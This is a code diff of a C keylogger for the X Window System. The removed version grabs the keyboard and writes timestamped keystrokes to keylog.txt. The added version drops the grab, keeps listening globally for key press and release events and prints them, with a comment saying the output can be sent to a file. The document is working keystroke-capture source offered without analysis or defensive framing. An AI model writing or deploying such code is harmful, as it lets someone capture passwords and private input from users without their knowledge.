@@ -1,42 +1,19 @@
 #include <X11/Xlib.h>
 #include <X11/keysym.h>
-#include <X11/Xutil.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <time.h>
-#include <unistd.h>
 
-// Function to log key events to a file
-void log_key(const char *event, const char *key) {
-    FILE *logfile = fopen("keylog.txt", "a");
-    if (logfile == NULL) {
-        perror("Error opening log file");
-        exit(1);
-    }
-
-    // Get current timestamp
-    time_t now = time(NULL);
-    struct tm *timeinfo = localtime(&now);
-
-    // Write timestamp and key event to the log
-    fprintf(logfile, "%02d-%02d-%04d %02d:%02d:%02d - %s: %s\n", 
-        timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900,
-        timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec, event, key);
-
-    fclose(logfile);
+void log_key(const char *event_type, const char *key) {
+    printf("%s: %s\n", event_type, key);  // Log key event to console (you can change it to file if needed)
 }
 
-// Function to get a string representation of the key
-char* get_key_string(XKeyEvent *event, XIC xic) {
+char* get_key_string(XKeyEvent *event, Display *display) {
     static char buf[128];
     KeySym keysym;
-    int len;
-
-    // Use Xutf8LookupString instead of XLookupString
-    len = Xutf8LookupString(xic, event, buf, sizeof(buf), &keysym, NULL);
+    int len = XLookupString(event, buf, sizeof(buf), &keysym, NULL);
 
     if (len > 0) {
-        buf[len] = '\0';
+        buf[len] = '\0';  // Null-terminate the string
         return buf;
     } else {
         return XKeysymToString(keysym);
@@ -47,51 +24,32 @@ int main() {
     Display *display;
     Window root;
     XEvent event;
-    XIM xim;
-    XIC xic;
 
-    // Open connection to X server
-    display = XOpenDisplay(NULL);
+    display = XOpenDisplay(NULL);  // Open connection to X server
     if (display == NULL) {
-        fprintf(stderr, "Cannot open display\n");
+        fprintf(stderr, "Unable to open X display\n");
         exit(1);
     }
 
-    root = DefaultRootWindow(display);
+    root = DefaultRootWindow(display);  // Get the root window
 
-    // Initialize input methods for handling international input
-    xim = XOpenIM(display, NULL, NULL, NULL);
-    if (!xim) {
-        fprintf(stderr, "Failed to open input method\n");
-        exit(1);
-    }
+    // Only listen for keyboard events, without grabbing the entire keyboard
+    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);  // Listen for key events globally
 
-    xic = XCreateIC(xim, XNInputStyle, XIMPreeditNothing | XIMStatusNothing, XNClientWindow, root, NULL);
+    printf("Keylogger started. The keyboard can still be used by the user.\n");
 
-    if (!xic) {
-        fprintf(stderr, "Failed to create input context\n");
-        exit(1);
-    }
-
-    // Grab the entire keyboard
-    XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);
-
-    // Grab all input events
-    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);
-
-    // Main loop to capture key events
     while (1) {
-        XNextEvent(display, &event);
+        XNextEvent(display, &event);  // Wait for the next event
         if (event.type == KeyPress) {
-            char *key = get_key_string(&event.xkey, xic);
-            log_key("Key Pressed", key);
-        } else if (event.type == KeyRelease) {
-            char *key = get_key_string(&event.xkey, xic);
-            log_key("Key Released", key);
+            char *key = get_key_string(&event.xkey, display);  // Get key string
+            log_key("Key Pressed", key);  // Log key press
+        }
+        if (event.type == KeyRelease) {
+            char *key = get_key_string(&event.xkey, display);  // Get key string
+            log_key("Key Released", key);  // Log key release
         }
     }
 
-    XCloseIM(xim);
-    XCloseDisplay(display);
+    XCloseDisplay(display);  // Close connection to X server
     return 0;
 }
